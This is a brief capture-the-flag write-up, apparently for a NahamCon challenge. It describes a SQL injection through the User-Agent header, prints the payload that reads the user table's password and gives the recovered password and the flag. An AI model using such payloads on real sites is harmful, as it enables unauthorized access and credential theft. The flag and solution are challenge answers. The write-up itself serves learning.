<p align="center">
    <img alt="Follow" src="https://img.shields.io/github/followers/EffectRenan?style=social">
    <img alt="Tweet" src="https://img.shields.io/twitter/follow/EffectRenan?label=Follow&style=social">
</p>

**Challenge**:  ...

http://challenge.nahamcon.com:31996/profile shows the log based on a post, user and User-Agent.

User-Agent is vulnerable to SQL injection.

Payload: `' || (SELECT password FROM user));-- -`

User's password: `J3H8cqMNWxH68mTj`

**Flag**: flag{8b31eecb1831ed594fa27ef5b431fe34}
